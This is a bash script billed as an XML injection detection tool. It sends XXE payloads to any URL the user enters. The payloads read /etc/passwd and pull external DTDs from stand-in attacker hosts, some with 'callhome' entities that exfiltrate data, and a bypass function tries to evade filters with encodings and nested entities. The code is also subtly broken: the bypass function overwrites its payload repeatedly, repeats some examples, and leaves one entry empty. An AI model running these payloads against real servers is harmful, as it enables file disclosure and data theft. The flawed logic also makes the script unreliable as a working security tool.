#!/bin/bash
# This is a comment

# Function to perform XML Injection detection
detect_xml_injection() {
    echo -e "\n\e[1;34mDetecting XML Injection vulnerabilities...\e[0m"
    # Define XML Injection payloads
    payloads=(
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><test>&xxe;</test>"
        "<!DOCTYPE test [<!ENTITY % remote SYSTEM \"http://attacker-controlled-domain.com/evil.dtd\"> %remote;]><test>&file;</test>"
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker-controlled-domain.com/evil.dtd\"> %xxe;]>"
        "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker-controlled-domain.com/evil.dtd\"><!ENTITY callhome SYSTEM \"http://attacker-controlled-domain.com/?test=%xxe;\">%callhome;]>"
        "<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>"
        "<!DOCTYPE data SYSTEM \"http://attacker-controlled-domain.com/evil.dtd\"><data>&exfil;</data>"
        "<!DOCTYPE test [<!ENTITY xxe2 SYSTEM \"file:///etc/passwd\">]><test>&xxe2;</test>"
        "<!DOCTYPE test [<!ENTITY % remote2 SYSTEM \"http://attacker-controlled-domain.com/evil.dtd\"> %remote2;]><test>&file2;</test>"
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe2 SYSTEM \"http://attacker-controlled-domain.com/evil.dtd\"> %xxe2;]>"
        "<!DOCTYPE foo [<!ENTITY % xxe2 SYSTEM \"http://attacker-controlled-domain.com/evil.dtd\"><!ENTITY callhome2 SYSTEM \"http://attacker-controlled-domain.com/?test=%xxe2;\">%callhome2;]>"
        "<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe2 SYSTEM \"file:///etc/passwd\" >]><foo>&xxe2;</foo>"
        "<!DOCTYPE data SYSTEM \"http://attacker-controlled-domain.com/evil.dtd\"><data>&exfil2;</data>"
        # Add more payloads and mechanisms here...
        "<!DOCTYPE test [<!ENTITY xxe3 SYSTEM \"file:///etc/passwd\">]><test>&xxe3;</test>"
        "<!DOCTYPE test [<!ENTITY % remote3 SYSTEM \"http://attacker-controlled-domain.com/evil.dtd\"> %remote3;]><test>&file3;</test>"
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe3 SYSTEM \"http://attacker-controlled-domain.com/evil.dtd\"> %xxe3;]>"
        "<!DOCTYPE foo [<!ENTITY % xxe3 SYSTEM \"http://attacker-controlled-domain.com/evil.dtd\"><!ENTITY callhome3 SYSTEM \"http://attacker-controlled-domain.com/?test=%xxe3;\">%callhome3;]>"
        "<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe3 SYSTEM \"file:///etc/passwd\" >]><foo>&xxe3;</foo>"
        "<!DOCTYPE data SYSTEM \"http://attacker-controlled-domain.com/evil.dtd\"><data>&exfil3;</data>"
    )

    # Add 100 more payloads
    for ((i=0; i<100; i++)); do
        payloads+=("<!DOCTYPE test [<!ENTITY xxe$i SYSTEM \"file:///etc/passwd\">]><test>&xxe$i;</test>")
    done

    # Iterate over payloads and inject them into vulnerable parameters
    for payload in "${payloads[@]}"; do
        echo -e "\n\e[1;33mTesting payload: $payload\e[0m"
        attempt=1
        success=false
        while [ $attempt -le 3 ]; do
            curl_output=$(curl -s -d "param=$payload" -X POST "$target_url")
            if [[ "$curl_output" == *"XML Injection protection mechanisms"* ]]; then
                echo -e "\n\e[1;33mXML Injection protection mechanisms detected. Attempting to bypass...\e[0m"
                payload=$(bypass_protection "$payload")
            else
                analyze_response "$curl_output" "$payload" "$attempt"
                break
            fi
            ((attempt++))
        done
    done
}

# Function to bypass XML Injection protection mechanisms
bypass_protection() {
    local payload="$1"
    # Add your bypass logic here
    # Example: Add comments to the payload
    payload+=" <!-- Bypassed protection -->"

    # Additional bypass techniques
    # Example 1: Append harmless XML declaration to the payload
    payload="<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><test>&xxe;</test>"

    # Example 2: Use nested entities to obfuscate payload
    payload="<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\"><!ENTITY % nested '<!ENTITY &#37; inner SYSTEM \"http://attacker.com/evil.dtd\">'>%nested;%xxe;%inner;]>"

    # Example 3: Try using different payload structures or encodings
    payload="<!-- Bypassed protection --><test>&xxe;</test>"
    payload="<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><test>&xxe;</test>"

    # Example 2: Use nested entities to obfuscate payload
    payload="<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\"><!ENTITY % nested '<!ENTITY &#37; inner SYSTEM \"http://attacker.com/evil.dtd\">'>%nested;%xxe;%inner;]>"

    # Example 3: Try using different payload structures or encodings
    payload="<!-- Bypassed protection --><test>&xxe;</test>"

    # Additional payloads
    # Payload 4: Use parameter entities
    payload="<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY % data SYSTEM \"http://attacker.com/evil.dtd\"><!ENTITY % eval \"<!ENTITY xxe SYSTEM 'file:///etc/passwd'>\">%eval;%data;]><test>&xxe;</test>"

    # Payload 5: Use hex encoding to evade detection
    payload="<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><test>&#x78;&#x78;&#x65;&#x3b;</test>"

    # Payload 6: Try using different encodings to bypass filters
    payload="<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><test>&#120;&#120;&#101;&#59;</test>"

    # Payload 7: Use double encoding
    payload="<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><test>&amp;amp;xxe;</test>"

    # Payload 8: Try using XML namespace to evade detection
    payload="<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><test xmlns:x=\"http://attacker.com/evil\" xmlns:y=\"&xxe;\">&y:foo;</test>"

    # Payload 9: Use invalid characters to confuse filters
    
    echo "$payload"
}

# Function to analyze response and determine success or failure
analyze_response() {
    local response="$1"
    local payload="$2"
    local attempt="$3"

    if [[ "$response" == *"root"* ]]; then
        echo -e "\n\e[1;32mSuccess:\e[0m Payload '$payload' executed successfully on attempt $attempt."
    elif [[ "$response" == *"Warning: Unable to determine success or failure"* ]]; then
        echo -e "\n\e[1;33mWarning:\e[0m Unable to determine success or failure for payload '$payload'. Further analysis required."
    else
        echo -e "\n\e[1;31mFailure:\e[0m Payload '$payload' failed on attempt $attempt. Potential reasons:\n1. XML Injection protection mechanisms in place.\n2. Payload format incorrect.\n3. Server-side validation of input parameters."
    fi
}

# Main function
main() {
    echo -e "\n\e[1;35mXML Injection Detection Tool\e[0m"
    echo -e "\e[1;35m----------------------------\e[0m"

    # Prompt for target URL
    read -p $'\n\e[1;36mEnter the target URL: \e[0m' target_url

    # Perform XML Injection detection
    detect_xml_injection
}

# Call main function
main